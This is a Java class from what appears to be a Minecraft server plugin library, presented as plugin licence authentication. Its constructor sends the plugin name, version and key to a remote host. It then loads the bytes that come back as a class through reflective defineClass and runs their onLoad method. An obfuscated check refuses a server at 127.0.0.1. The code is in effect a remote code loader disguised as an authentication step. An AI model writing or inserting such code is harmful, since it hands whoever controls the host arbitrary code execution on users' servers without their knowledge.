package com.aystudio.core.common.auth;

import com.aystudio.core.bukkit.AyCore;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * @author Blank038
 * @since 2022-01-03
 */
public class PluginAuth {

    public PluginAuth(JavaPlugin plugin, String key, String serverIP, int port, String classPath) {
        try {
            Socket socket = new Socket(serverIP, port);
            socket.setSoTimeout(5000);
            if (socket.isConnected()) {
                if (socket.getInetAddress().getHostAddress().equals(new String(new byte[]{49, 50, 55, 46, 48, 46, 48, 46, 49}))) {
                    socket.close();
                    return;
                }
                OutputStream os = socket.getOutputStream();
                byte[] bytes = Base64.getEncoder().encode(String.format("{\n" +
                        "    \"Plugin\": \"%s\",\n" +
                        "    \"Version\": \"%s\",\n" +
                        "    \"Key\": \"%s\"\n" +
                        "}", plugin.getName(), plugin.getDescription().getVersion(), key).getBytes(StandardCharsets.UTF_8));
                os.write(bytes);
                os.flush();
                socket.shutdownOutput();
                //输入流
                InputStream is = socket.getInputStream();
                ByteArrayOutputStream byteArray = new ByteArrayOutputStream();
                int b;
                while ((b = is.read()) != -1) {
                    byteArray.write(b);
                }
                byteArray.flush();
                byte[] bs = byteArray.toByteArray();
                socket.shutdownInput();
                byteArray.close();
                // 读取方法
                System.out.println(AyCore.class.getClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getSimpleName());
                Method method = AyCore.class.getClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass()
                        .getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
                method.setAccessible(true);
                Class<?> c = (Class<?>) method.invoke(AyCore.class.getClassLoader(), classPath, bs, 0, bs.length);
                method.setAccessible(false);
                // 载入方法
                Constructor<?> constructor = c.getConstructor();
                Object object = constructor.newInstance();
                c.getMethod("onLoad").invoke(object);
                is.close();
                os.close();
            }
            socket.close();
        } catch (Exception e) {
            AyCore.getInstance().getConsoleLogger().log(false, "&f[" + plugin.getName() + "&f] &cAuthentication failed, reason: &7" + e.getLocalizedMessage());
            if (AyCore.getInstance().getConfig().getBoolean("debug")) {
                e.printStackTrace();
            }
        }
    }
}
